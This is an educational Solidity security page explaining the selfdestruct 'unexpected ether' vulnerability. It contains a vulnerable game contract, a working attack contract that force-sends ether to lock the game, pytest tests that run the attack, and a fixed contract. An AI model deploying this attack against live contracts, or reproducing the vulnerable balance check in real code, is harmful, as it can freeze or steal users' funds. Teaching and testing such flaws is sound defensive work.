---
sidebar_position: 4
tags: [selfdestruct, solidity, attack]
---

# Self destruct

### Description

Although the blockchain is considered an immutable structure, Solidity language provides functionality that removes the smart contract state and code from the blockchain. This function is `selfdestruct`, and it could be used to remove the smart contract state and send all  Ether, stored at the address associated with the call, to a designated wallet or contract. This behavior presents the vulnerability, also called `unexpected ether`.

The following smart contract implementation presents the simple game using concurrency logic. Any user can deposit one ether to the contract until the `balance` reaches `5`. Whoever deposited the last ether amounted to the target value will be able to claim the reward. The issue is on line 11, where the requirement uses `address(this).balance` to check the contract balance:

```solidity title=/contracts/self_destruct/EtherGame.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/self_destruct/EtherGame.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract EtherGame {
    uint256 public targetAmount = 5 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        // highlight-next-line
        uint256 balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    function balanceOf() public view returns (uint256) {
        return address(this).balance;
    }
}
```

Here comes the `AttackEtherGame` smart contract that would attempt to stop the game by sending `unexpected ether` to the contract game using the `selfdestruct` function:

```solidity title=/contracts/self_destruct/AttackEtherGame.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/self_destruct/AttackEtherGame.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IEtherGame {}

contract AttackEtherGame {
    IEtherGame etherGame;

    constructor(address _etherGameAddress) {
        etherGame = IEtherGame(_etherGameAddress);
    }

    function attack() public payable {
        address payable addr = payable(address(etherGame));
        // highlight-next-line
        selfdestruct(addr);
    }

    function deposit() public payable {}

    function balanceOf() public view returns (uint256) {
        return address(this).balance;
    }
}

```

### How to test

Let's write a unit test that executes the EtherGame attack and verify the game is distorted:

```python sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/tests/self_destruct/test_self_destruct.py title=/tests/self_destruct/test_self_destruct.py
import pytest
from brownie import exceptions
from scripts.self_destruct.deploy_and_attack import (
    deploy_attack_ether_game,
    deploy_ether_game,
    deploy_ether_game_fixed,
)
from scripts.utils import get_attacker_account, get_default_account, get_user_account
from web3 import Web3

def test_ether_game_successful_attack():
    # 1. Deploy EtherGame contract
    ether_game = deploy_ether_game()
    # 2. Play the game
    ether_game_deposit_tx = ether_game.deposit(
        {"from": get_user_account(), "value": Web3.toWei(1, "ether")},
    )
    ether_game_deposit_tx.wait(1)
    # 3. Deploy AttackEtherGame contract
    attack_ether_game = deploy_attack_ether_game(ether_game.address)
    # 4. Deposit some funds to the AttackEtherGame contract, so that they could be sent to the EtherGame
    tx = attack_ether_game.deposit(
        {"from": get_attacker_account(), "value": Web3.toWei(5, "ether")}
    )
    tx.wait(1)

    assert ether_game.balanceOf() / 10**18 == 1

    # 5. Call `attack` function on the AttackEtherGame contract to break the EtherGame balance
    attack_tx = attack_ether_game.attack(
        {"from": get_attacker_account()},
    )
    attack_tx.wait(1)

    assert ether_game.balanceOf() / 10**18 == 6

    # 6. EtherGame is no longer accepts deposits
    with pytest.raises(exceptions.VirtualMachineError):
        ether_game_deposit_tx2 = ether_game.deposit(
            {"from": get_user_account(), "value": Web3.toWei(1, "ether")},
        )
        ether_game_deposit_tx2.wait(1)

```

### How to fix

To fix this issue, it is recommended to avoid reliance on the `this.balance` value within the smart contract logic or guards. Instead, you should use a separate variable `balance` to account for the actual balance every time users call the `deposit` function. Consider the following fix L12-13:

```solidity title=/contracts/self_destruct/EtherGameFixed.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/self_destruct/EtherGameFixed.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract EtherGameFixed {
    uint256 public targetAmount = 5 ether;
    address public winner;
    uint256 public balance;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        // highlight-next-line
        balance += msg.value;
        // highlight-next-line
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    function balanceOf() public view returns (uint256) {
        return balance;
    }
}

```

### Demo

The following unit test demonstrates that `EtherGameFixed` smart contract is no longer breakable:

```python sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/tests/self_destruct/test_self_destruct.py title=/tests/self_destruct/test_self_destruct.py
...

def test_ether_game_fixed_failed_attack():
    # 1. Deploy EtherGameFixed contract
    ether_game_fixed = deploy_ether_game_fixed()
    # 2. Play the game
    ether_game_deposit_tx = ether_game_fixed.deposit(
        {"from": get_user_account(), "value": Web3.toWei(1, "ether")},
    )
    ether_game_deposit_tx.wait(1)
    # 3. Deploy AttackEtherGame contract
    attack_ether_game = deploy_attack_ether_game(ether_game_fixed.address)
    # 4. Deposit some funds to the AttackEtherGame contract, so that they could be sent to the EtherGame
    tx = attack_ether_game.deposit(
        {"from": get_attacker_account(), "value": Web3.toWei(5, "ether")}
    )
    tx.wait(1)
    # 5. Call `attack` function on the AttackEtherGame contract to destort the EtherGame balance
    attack_tx = attack_ether_game.attack(
        {"from": get_attacker_account()},
    )
    attack_tx.wait(1)

    assert ether_game_fixed.balanceOf() / 10**18 == 1

    ether_game_deposit_tx2 = ether_game_fixed.deposit(
        {"from": get_user_account(), "value": Web3.toWei(1, "ether")},
    )
    ether_game_deposit_tx2.wait(1)

    assert ether_game_fixed.balanceOf() / 10**18 == 2

```

**Thank you for reading and good luck with building secure blockchain!**